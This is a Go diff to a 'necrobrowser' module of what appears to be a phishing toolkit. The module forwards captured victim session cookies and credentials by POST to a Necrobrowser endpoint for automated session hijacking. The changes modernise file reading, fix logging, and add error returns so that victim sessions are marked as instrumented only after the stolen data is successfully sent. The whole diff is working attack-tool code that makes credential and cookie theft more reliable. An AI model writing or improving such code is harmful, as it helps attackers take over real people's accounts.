@@ -2,7 +2,7 @@ package necrobrowser
 
 import (
 	"encoding/json"
-	"io/ioutil"
+	"os"
 	"strings"
 	"time"
 
@@ -96,7 +96,7 @@ func Load(s *session.Session) (m *Necrobrowser, err error) {
 	m.Endpoint = config.Endpoint
 
 	m.Profile = config.Profile
-	bytes, err := ioutil.ReadFile(m.Profile)
+	bytes, err := os.ReadFile(m.Profile)
 	if err != nil {
 		m.Warning("Error reading profile file %s: %s", m.Profile, err)
 		m.Enabled = false
@@ -175,11 +175,11 @@ func (module *Necrobrowser) CheckSessionCookies() {
 				module.Debug("error marshalling %s", err)
 			}
 
-			module.Info("instrumenting %s using %d cookies", tui.Bold(tui.Red(v.ID)), tui.Bold(tui.Red(string(rune(cookiesFound)))))
-			module.Instrument(v.ID, v.Cookies, string(j))
-
-			// prevent the session to be instrumented twice
-			_ = db.SetSessionAsInstrumented(v.ID)
+			module.Info("instrumenting %s using %d cookies", tui.Bold(tui.Red(v.ID)), cookiesFound)
+			if err := module.Instrument(v.ID, v.Cookies, string(j)); err == nil {
+				// only mark as instrumented when the POST actually succeeded
+				_ = db.SetSessionAsInstrumented(v.ID)
+			}
 		}
 	}
 }
@@ -193,14 +193,14 @@ func Contains(slice *[]string, find string) bool {
 	return false
 }
 
-func (module *Necrobrowser) Instrument(victimID string, cookieJar []db.VictimCookie, credentialsJSON string) {
+func (module *Necrobrowser) Instrument(victimID string, cookieJar []db.VictimCookie, credentialsJSON string) error {
 	var necroCookies []SessionCookie
 	const timeLayout = "2006-01-02 15:04:05 -0700 MST"
 
 	for _, c := range cookieJar {
 		t, err := time.Parse(timeLayout, c.Expires)
 		if err != nil {
-			module.Warning("warning: cant's parse Expires field (%s) of cookie %s. skipping cookie", c.Expires, c.Name)
+			module.Warning("warning: can't parse Expires field (%s) of cookie %s. skipping cookie", c.Expires, c.Name)
 			continue
 		}
 
@@ -221,7 +221,7 @@ func (module *Necrobrowser) Instrument(victimID string, cookieJar []db.VictimCoo
 	c, err := json.MarshalIndent(necroCookies, "", "\t")
 	if err != nil {
 		module.Warning("Error marshalling the cookies: %s", err)
-		return
+		return err
 	}
 
 	newRequest := module.RequestTemplate
@@ -237,10 +237,10 @@ func (module *Necrobrowser) Instrument(victimID string, cookieJar []db.VictimCoo
 		Post(module.Endpoint)
 
 	if err != nil {
-		module.Warning("Error sending request to Necrobrowser: %s", err)
-		return
+		module.Warning("error sending request to Necrobrowser: %s", err)
+		return err
 	}
 
 	module.Info("instrumenting-response %s:\n%v", tui.Bold(tui.Red(victimID)), tui.Bold(tui.Green(resp.String())))
-	return
+	return nil
 }
